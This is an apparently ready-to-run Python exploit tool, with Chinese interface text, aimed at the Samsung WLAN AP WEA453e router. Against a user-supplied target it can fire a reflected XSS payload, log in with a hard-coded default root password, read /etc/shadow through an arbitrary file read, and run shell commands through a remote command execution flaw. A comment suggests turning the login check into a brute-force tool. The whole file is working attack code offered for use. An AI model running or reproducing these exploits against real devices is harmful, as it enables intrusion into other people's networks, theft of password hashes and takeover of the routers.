

import requests
import urllib3
import sys

urllib3.disable_warnings()


def title():
    print("""
        [------------------------------------------------------------------------]
        [------------------ 三星路由器 WLAN AP WEA453e 漏洞合集 --------------------]
        [------------------ Use: python3 samsungwlanapscan.py -------------------]
        [------------------         Author: Henry4E36         -------------------]
        [------------------------------------------------------------------------]
    """)

    print("\n")
    print("""[-]说明:
                [1]: XSS检测；
                [2]: 通用弱口令检测；
                [3]: 任意文件读取；
                [4]: 远程命令执行；
                [5]: 退出。
    
    
    """)



def switch_options(option):
    options = {
        "1": xssscan,
        "2": login,
        "3": read_files,
        "4": rce,
        "5": sys.exit
    }
    return options.get(option, "[!]  输入有误！")

# 检测XSS漏洞
def xssscan(url):
    xss_url = url + "/<script>alert(1)</script>"
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
    }
    try:
        res = requests.get(url=xss_url,headers=headers,verify=False,timeout=5)
        if '<html><body><h2><font color="red">/tmp/www/<script>alert(1)</script></font> not found !</h2></body></html>' in res.text and res.status_code == 404:
            print(f"\033[31m[!]  目标系统: {url} 存在反射型XSS\033[0m")
        else:
            print(f"[0]  目标系统: {url} 不存在反射型XSS")
    except Exception as e:
        print("[0]  目标系统出现意外错误！\n", e)

# 检测通用弱口令
def login(url):
    login_url = url + "/main.ehp"
    # 这可以修改下进行弱口令爆破。
    data = "httpd%3BGeneral%3Blang=en&login_id=root&login_pw=sweap12%7E"
    headers = {
             "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
         }
    try:
        res = requests.post(url=login_url,data=data,headers=headers,verify=False,timeout=5)
        if "User" in res.text and "root" in res.text and res.status_code == 200:
            print(f"\033[31m[!]  目标系统: {url} 存在通用弱口令\033[0m")
            print(f"\033[31m[-]  user:root   password:sweap12~\033[0m")
        else:
            print(f"[0]  目标系统: {url} 不存在通用弱口令")
    except Exception as e:
        print("[0]  目标系统出现意外错误！\n", e)

def read_files(url):
    # passwd 也可以读取
    vul_url = url + "/(download)/etc/shadow"
    headers = {
                 "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
             }
    try:
        res = requests.get(url=vul_url,headers=headers,verify=False,timeout=5)
        if "root" in res.text and res.status_code == 200:
            print(f"\033[31m[!]  目标系统: {url} 存在任意文件读取！")
            print("[-]  正在读取文件中............\033[0m")
            print(f"[0]  文件内容为: \n{res.text}")
        else:
            print(f"[0]  目标系统: {url} 不存在任意文件读取")
    except Exception as e:
        print("[0]  目标系统出现意外错误！\n", e)

def rce(url):
    rce_url = url + "/(download)/tmp/1.txt"

    headers = {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
                    "Referer": f"{url}/main.ehp"
                 }

    data = 'command1=shell:ls -la | dd of=/tmp/1.txt'
    try:
        res = requests.post(url=rce_url,data=data,headers=headers,verify=False,timeout=5)
        if "root" in res.text and res.status_code == 200:
            print(f"\033[31m[!]  目标系统: {url} 存在远程命令执行！\033[0m")
            print(f"[0]  响应内容为: \n{res.text}")
        else:
            print(f"[0]  目标系统: {url} 不存在任意文件读取")
    except Exception as e:
        print("[0]  目标系统出现意外错误！\n", e)


if __name__ =="__main__":
    title()
    url = str(input("[-]  请输入目标系统URL:\n"))
    option = str(input("[-]  请选择需要检测的项:\n"))
    func = switch_options(option)
    try:
        if "exit" in str(func):
            func(0)
        else:
            func(url)
    except Exception as e:
        print("[0]  输入有误！")


